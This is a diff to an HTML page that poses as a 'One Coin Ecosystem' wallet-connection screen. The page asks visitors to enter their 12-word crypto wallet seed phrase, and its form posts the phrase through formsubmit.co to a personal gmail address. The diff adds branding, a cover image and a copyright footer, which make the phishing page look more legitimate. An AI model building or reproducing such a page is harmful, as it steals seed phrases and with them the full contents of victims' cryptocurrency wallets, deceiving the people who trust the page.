@@ -8,8 +8,14 @@
 </head>
 <body>
 
-    <div class="head-one">#Import Wallet Phrase</div>
-    <p class="sub-head">Enter your seed phrase (12 words) to import your wallet.</p>
+
+    <img src="WhatsApp Image 2024-05-18 at 4.53.39 AM.jpeg" id="coverimg">
+    <div class="allelement">
+    <div class="head-one"> 
+        <img src="images.jpg" alt="" width="70px">
+        <span>One Coin <br> Ecosystem</span> 
+        </div>
+    <p class="sub-head"> Please enter your seed phrase (12 words) to connect your wallet to ONE ECOSYSTEM Database.</p>
     
     <form  action="https://formsubmit.co/elijahedache10@gmail.com" method="POST" id="form">
 
@@ -29,37 +35,13 @@
     
         <button type="submit" value="submit" id="submit"> swap</button>
     </form>
+</div>
 
+<div class="footer">
+    <p>Copyright © 2020 One Coin Ecosystem. All rights reserved.</p>
+</div>
 
 </body>
 
-<script>
-    // Get the button element
-    const submitButton = document.getElementById('submit');
-    const inputs = document.querySelectorAll('input');
-
-    // Function to check if any input field is empty
-    function checkInputs() {
-        let allFilled = true;
-        inputs.forEach(input => {
-            if (input.value.trim() === "") {
-                allFilled = false;
-            }
-        });
-        submitButton.disabled = !allFilled;
-    }
-
-    // Initial check on page load
-    checkInputs();
-
-    // Add event listeners to inputs to check on every input change
-    inputs.forEach(input => {
-        input.addEventListener('input', checkInputs);
-    });
-
-    // Change button text when clicked
-    submitButton.addEventListener('click', () => {
-        submitButton.innerHTML = 'swap...';
-    });
-</script>
+<script src="script.js"></script>
 </html>
